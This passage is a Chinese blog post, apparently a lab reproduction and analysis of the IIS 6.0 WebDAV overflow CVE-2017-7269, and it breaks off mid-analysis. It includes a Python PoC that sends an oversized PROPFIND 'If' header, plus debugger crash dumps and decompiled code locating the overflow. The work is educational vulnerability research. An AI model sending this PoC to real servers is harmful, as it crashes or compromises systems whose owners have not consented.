<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2017-7269复现分析 | Yeanhoo's Blogs</title><meta name="description" content="CVE-2017-7296复现分析Microsoft Internet Information Services 缓冲区错误漏洞 CNNVD编号：CNNVD-201703-1074 危害等级：  超危  CVE编号： CVE-2017-7269 漏洞类型： 缓冲区错误 发布时间： 2017-03-27 威胁类型： 远程 更新时间： 2019-07-08 厂    商： microsoft  漏洞简"><meta name="keywords" content="CVE-2017-7296复现分析"><meta name="author" content="Yeanhoo"><meta name="copyright" content="Yeanhoo"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/yeanhoo/img/favicon.png"><link rel="canonical" href="http://yeanhoo.gitee.io/2021/03/07/CVE-2017-7269%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><meta name="360-site-verification" content="{&quot;theme_color&quot;:{&quot;enable&quot;:true,&quot;main&quot;:&quot;#05050C&quot;,&quot;paginator&quot;:&quot;#EEEEEE&quot;,&quot;button_hover&quot;:&quot;#FF7242&quot;,&quot;text_selection&quot;:&quot;#00c4b6&quot;,&quot;link_color&quot;:&quot;#99a9bf&quot;,&quot;meta_color&quot;:&quot;#858585&quot;,&quot;hr_color&quot;:&quot;#A4D8FA&quot;,&quot;code_foreground&quot;:&quot;#F47466&quot;,&quot;code_background&quot;:&quot;rgba(27, 31, 35, .05)&quot;,&quot;toc_color&quot;:&quot;#EBDEFE&quot;,&quot;blockquote_padding_color&quot;:&quot;#49b1f5&quot;,&quot;blockquote_background_color&quot;:&quot;#7EA9B5&quot;}}"/><meta property="og:type" content="article"><meta property="og:title" content="CVE-2017-7269复现分析"><meta property="og:url" content="http://yeanhoo.gitee.io/2021/03/07/CVE-2017-7269%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><meta property="og:site_name" content="Yeanhoo's Blogs"><meta property="og:description" content="CVE-2017-7296复现分析Microsoft Internet Information Services 缓冲区错误漏洞 CNNVD编号：CNNVD-201703-1074 危害等级：  超危  CVE编号： CVE-2017-7269 漏洞类型： 缓冲区错误 发布时间： 2017-03-27 威胁类型： 远程 更新时间： 2019-07-08 厂    商： microsoft  漏洞简"><meta property="og:image" content="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2021-3-8-1.jpg"><meta property="article:published_time" content="2021-03-07T13:03:13.211Z"><meta property="article:modified_time" content="2021-03-08T13:46:09.607Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = '2'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/yeanhoo/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="二进制漏洞——堆溢出复现(DWORD SHOOT)" href="http://yeanhoo.gitee.io/2021/03/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0(DWORD%20SHOOT)/"><link rel="next" title="简易加密壳" href="http://yeanhoo.gitee.io/2021/03/07/%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E5%A3%B3/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/yeanhoo/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: false,
  copyright: undefined,
  ClickShowText: {"text":"富强,民主,文明,和谐","fontSize":"15px"},
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true
  }</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/yeanhoo/atom.xml" title="Yeanhoo's Blogs" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/yeanhoo/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/yeanhoo/archives/"><div class="headline">文章</div><div class="length_num">50</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/yeanhoo/tags/"><div class="headline">标签</div><div class="length_num">89</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/yeanhoo/categories/"><div class="headline">分类</div><div class="length_num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yeanhoo/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/yeanhoo/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/yeanhoo/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-7296复现分析"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-7296复现分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Microsoft-Internet-Information-Services-缓冲区错误漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">Microsoft Internet Information Services 缓冲区错误漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现环境"><span class="toc-number">1.3.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详细分析"><span class="toc-number">1.4.</span> <span class="toc-text">详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#定位溢出点"><span class="toc-number">1.4.1.</span> <span class="toc-text">定位溢出点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#静态分析"><span class="toc-number">1.4.2.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP分析"><span class="toc-number">1.4.3.</span> <span class="toc-text">EXP分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实现步骤"><span class="toc-number">1.4.4.</span> <span class="toc-text">实现步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#公开的EXP代码"><span class="toc-number">1.6.</span> <span class="toc-text">公开的EXP代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-number">1.7.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><header class="post-bg" id="page-header" style="background-image: url(https://gitee.com/yeanhoo/BlogImages/raw/master/img/2021-3-8-1.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/yeanhoo/">Yeanhoo's Blogs</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yeanhoo/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/yeanhoo/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/yeanhoo/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">CVE-2017-7269复现分析</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-03-07 21:03:13"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-03-07</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2021-03-08 21:46:09"><i class="fas fa-history fa-fw"></i> 更新于 2021-03-08</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/yeanhoo/categories/C-C/">C\C++</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="CVE-2017-7296复现分析"><a href="#CVE-2017-7296复现分析" class="headerlink" title="CVE-2017-7296复现分析"></a>CVE-2017-7296复现分析</h2><h3 id="Microsoft-Internet-Information-Services-缓冲区错误漏洞"><a href="#Microsoft-Internet-Information-Services-缓冲区错误漏洞" class="headerlink" title="Microsoft Internet Information Services 缓冲区错误漏洞"></a>Microsoft Internet Information Services 缓冲区错误漏洞</h3><ul>
<li>CNNVD编号：CNNVD-201703-1074</li>
<li>危害等级：  超危 </li>
<li>CVE编号： <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269" target="_blank" rel="noopener">CVE-2017-7269</a></li>
<li>漏洞类型： 缓冲区错误</li>
<li>发布时间： <a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?qstartdateXq=2017-03-27" target="_blank" rel="noopener">2017-03-27</a></li>
<li>威胁类型： 远程</li>
<li>更新时间： <a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?cvCnnvdUpdatedateXq=2019-07-08" target="_blank" rel="noopener">2019-07-08</a></li>
<li>厂    商： <a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201703-1074#" target="_blank" rel="noopener">microsoft</a></li>
</ul>
<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul>
<li><p><code>Internet Information Services（IIS）</code>是一套运行于<code>Microsoft Windows</code>中的互联网基本服务。</p>
</li>
<li><p><code>Microsoft Windows Server 2003 R2</code>中的<code>IIS 6.0</code>版本中的<code>WebDAV</code>服务的<code>ScStoragePathFromUrl</code>函数存在缓冲区溢出漏洞(堆溢出和栈溢出都包括)。远程攻击者可通过发送特制的<code>PROPFIND</code>请求利用该漏洞执行任意代码。</p>
</li>
<li><p><code>WEB</code>分布式创作和版本控制<code>WebDAV</code>是超文本传输协议<code>HTTP</code>的扩展，可促进用户之间在编辑和管理存储在万维网服务器上的文档和文件之间的协作。</p>
</li>
<li><p><code>ROPFIND</code>用于从<code>WEB</code>资源检索以XML存储的属性。它也被重载，以允许它检索远程系统的集合结构（也称为目录层次结构）。</p>
</li>
</ul>
<h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><hr>
<ul>
<li><code>Windows Server 2003 R2, Enterprise Edition with SP2</code>目标机<ul>
<li>开始菜单—&gt;管理工具—&gt;管理您的服务器—&gt;添加或删除角色(应用服务器(IIS,ASP,NET))</li>
<li>开始菜单—&gt;管理工具—&gt;Internet 信息服务(IIS)管理器—&gt;Web服务设置—&gt;WebDAV(允许)</li>
</ul>
</li>
<li><code>Windows 7 Enterprise with Service Pack 1 (x86)</code>攻击机<ul>
<li>用来执行EXP实现RCE漏洞利用</li>
</ul>
</li>
</ul>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_1.png" alt></p>
<h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><hr>
<h4 id="定位溢出点"><a href="#定位溢出点" class="headerlink" title="定位溢出点"></a>定位溢出点</h4><p>随便建立一个默认的网站<code>index</code>页面，测试使用<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">EXP</a>,可以成功触发由<code>w3wp.exe</code>创建<code>calc.exe</code></p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_2.gif" alt></p>
<p>微软给出的<code>WebDAV PROPFIND</code>方法的请求示例如下，可以通过<code>socket</code>的方式按照下述方式构造数据包</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PROPFIND /public/docs/myFile.doc HTTP/1.1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: XXX</span><br><span class="line">Depth: 0</span><br><span class="line">Translate: f</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a:propfind</span> <span class="attr">xmlns:a</span>=<span class="string">"DAV:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a:prop</span>&gt;</span><span class="tag">&lt;<span class="name">a:getcontenttype</span>/&gt;</span><span class="tag">&lt;/<span class="name">a:prop</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a:prop</span>&gt;</span><span class="tag">&lt;<span class="name">a:getcontentlength</span>/&gt;</span><span class="tag">&lt;/<span class="name">a:prop</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a:propfind</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于没有补丁程序且栈层严重损坏根据栈回溯定位溢出点比较麻烦，尝试开启<code>PageHeap</code>机制，启用<code>PageHeap</code>后，堆内存分配将会在分配内存后面紧跟了一个4k的<code>PAGE_NOACCESS</code>属性的页面,这种情况下，尝试读写执行所分配内存其后的地址将会导致访问冲突，因此启用<code>PageHeap</code>的好处是能在一定程度上检查内存越界。和<code>PAGE_GUARD</code>有点相似，任何尝试访问<code>PAGE_GUARD</code>保护页面的尝试都会导致系统引发<code>STATUS_GUARD_PAGE_VIOLATION</code>异常并关闭保护页面状态。</p>
<p>下载<a href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools/dbg_x86.msi" target="_blank" rel="noopener">旧版本<code>windbg</code>进行本地调试</a>，<code>windbg</code>目录下执行如下命令开启<code>PageHeap</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gflags.exe /p /enable C:\WINDOWS\system32\inetsrv\w3wp.exe</span><br></pre></td></tr></table></figure>

<p>修改<code>POC</code>代码，使其发送超长字符串导致溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">'192.168.1.2'</span>,<span class="number">80</span>))</span><br><span class="line">pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'</span></span><br><span class="line">pay+=<span class="string">'If: &lt;http://localhost/aaaaaaa'</span></span><br><span class="line">pay+=<span class="string">'A'</span>*<span class="number">10240</span></span><br><span class="line">pay+=<span class="string">'&gt;\r\n\r\n'</span></span><br><span class="line">sock.send(pay)</span><br></pre></td></tr></table></figure>
<p>使用<code>windbg</code>附加到<code>w3wp.exe</code>进程,在攻击机执行<code>POC</code>触发<code>PAGE_NOACCESS</code>,<code>windbg</code>自动断下，回显信息如下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">.................................................</span><br><span class="line">[...]</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 673e0000 6741e000   \\?\c:\windows\system32\inetsrv\httpext.dll</span><br><span class="line">ModLoad: 5bac0000 5bac6000   C:\WINDOWS\system32\staxmem.dll</span><br><span class="line">ModLoad: 6da00000 6da06000   C:\WINDOWS\system32\inetsrv\davcprox.dll</span><br><span class="line">(fe4.180): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00005014 ebx=00002809 ecx=0000026c edx=01e8c978 esi=020b6f14 edi=01e91000</span><br><span class="line">eip=673f6fdb esp=0133f330 ebp=0133f798 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">httpext!ScStoragePathFromUrl+0x360:</span><br><span class="line">673f6fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</span><br></pre></td></tr></table></figure>

<p>可以看到溢出点在<code>httpext!ScStoragePathFromUrl+0x360</code></p>
<p>查看拷贝内容<code>ESI</code>的值，是构造的超长字符串<code>AAAA…</code>转码<code>Unicode</code>后的内容</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; db esi</span><br><span class="line">020b6f14  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f24  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f34  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f44  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f54  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f64  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f74  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">020b6f84  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br></pre></td></tr></table></figure>

<p>调用栈信息如下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0133f798 673e9469 01e8c978 0133f800 00000000 httpext!ScStoragePathFromUrl+0x360</span><br><span class="line">0133f7ac 673f5484 020b2890 01e8c978 0133f800 httpext!CMethUtil::ScStoragePathFromUrl+0x18</span><br><span class="line">0133fc34 673f561e 01e8bba8 01e85eee 0133fc78 httpext!HrCheckIfHeader+0x15e</span><br><span class="line">0133fc44 673ef659 01e8bba8 01e85eee 00000001 httpext!HrCheckStateHeaders+0x10</span><br><span class="line">0133fc78 673ef7c5 01e8c340 0133fcd4 674104e2 httpext!CPropFindRequest::Execute+0xf0</span><br><span class="line">0133fc90 673f96f2 01e8c340 00000004 01357678 httpext!DAVPropFind+0x47</span><br><span class="line">0133fce0 673e7bc6 01e863e0 01e8bba8 01357678 httpext!CDAVExt::DwMain+0x12e</span><br><span class="line">0133fe04 5a5c2991 01357678 013563b8 01357008 httpext!DwDavFSExtensionProc+0x3f</span><br><span class="line">0133fe24 5a6368ff 013575e8 673e7b87 0133fe50 w3isapi!ProcessIsapiRequest+0x214</span><br></pre></td></tr></table></figure>

<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><hr>
<p><code>ScStoragePathFromUrl</code>函数声明如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SCODE __fastcall <span class="title">ScStoragePathFromUrl</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="comment">/* [in] */</span> <span class="keyword">const</span> IEcb&amp; ecb,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="comment">/* [in] */</span> LPCWSTR pwszUrl,<span class="comment">//userurl</span></span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="comment">/* [out] */</span> LPWSTR wszStgID,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="comment">/* [in/out] */</span> UINT* pcch,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="comment">/* [out] */</span> CVRoot** ppcvr = <span class="literal">NULL</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>IDA</code>查看<code>httpext!ScStoragePathFromUrl+0x360</code>位置，由于<code>qmemcpy</code>函数造成堆溢出</p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_3.png" alt></p>
<p>简单分析后发现三次<code>qmemcpy</code>函数的<code>Dst</code>地址都与<code>ScStoragePathFromUrl</code>第三个参数有关，根据调用栈信息回溯参数三来源于<code>HrCheckIfHeader</code>函数中的<code>String</code>变量，而<code>String</code>值来源于<code>CStackBuffer&lt;unsigned short,260&gt;</code></p>
<p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_4.png" alt></p>
<p>在<code>HrCheckIfHeader</code>函数中存在两次对<code>ScStoragePathFromUrl</code>函数的调用，第一次调用时发现<code>String</code>并未发生变化，而<code>v27</code>的值变为了<code>281c</code>，尝试跟进<code>ScStoragePathFromUrl</code>函数发现代码存在以下逻辑，显然将会由于路径长度超过缓存区大小从而将<code>URL</code>转换为真实物理路径的字符数存在<code>v27</code>所在地址中并返回。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HSE_UNICODE_URL_MAPEX_INFO</span> <span class="title">v40</span>;</span>  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">typedef struct _HSE_UNICODE_URL_MAPEX_INFO HSE_UNICODE_URL_MAPEX_INFO &#123;</span></span><br><span class="line"><span class="comment">      WCHAR lpszPath[MAX_PATH];//虚拟根目录映射到的物理路径</span></span><br><span class="line"><span class="comment">      DWORD dwFlags;//与URL关联的访问权限,指示URL是否具有读取，写入或执行权限</span></span><br><span class="line"><span class="comment">      DWORD cchMatchingPath;//物理路径中的字符数</span></span><br><span class="line"><span class="comment">      DWORD cchMatchingURL;//URL中的字符数</span></span><br><span class="line"><span class="comment">      DWORD dwReserved1;//保留。不使用</span></span><br><span class="line"><span class="comment">      DWORD dwReserved2;//保留。不使用</span></span><br><span class="line"><span class="comment">&#125; HSE_UNICODE_URL_MAPEX_INFO, * LPHSE_UNICODE_URL_MAPEX_INFO;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">v34 = a4;<span class="comment">//a4初始为0x82,a4=&amp;v27</span></span><br><span class="line"> <span class="keyword">String</span> = (<span class="keyword">wchar_t</span> *)a2;  <span class="comment">//pwszUrl=用户传入的URL</span></span><br><span class="line">	[...]</span><br><span class="line"> result = ScStripAndCheckHttpPrefix(a1, (<span class="keyword">const</span> <span class="keyword">unsigned</span> __int16 **)&amp;<span class="keyword">String</span>);<span class="comment">// 从URL切割相对路径存储到String</span></span><br><span class="line"> result = IEcbBase::ScReqMapUrlToPathEx(a1, <span class="keyword">String</span>, &amp;v40);<span class="comment">//将String转换为物理路径存储在`v40</span></span><br><span class="line"> v7 = _wcslen(<span class="keyword">String</span>);  </span><br><span class="line"> v16 = v40.cchMatchingPath;<span class="comment">//物理路径中字符数</span></span><br><span class="line"> v18 = (struct IEcb *)(v16 - v40.cchMatchingURL + v7 + <span class="number">1</span>);<span class="comment">//物理路径+相对路径+1</span></span><br><span class="line"> v19 = *v34 &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18;<span class="comment">//条件成立</span></span><br><span class="line"> v37 = v18;</span><br><span class="line"> <span class="keyword">if</span> ( v19 )<span class="comment">//执行该分支将不会进行memcpy函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v34 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18;<span class="comment">//将v18传给v34</span></span><br><span class="line">    <span class="keyword">if</span> 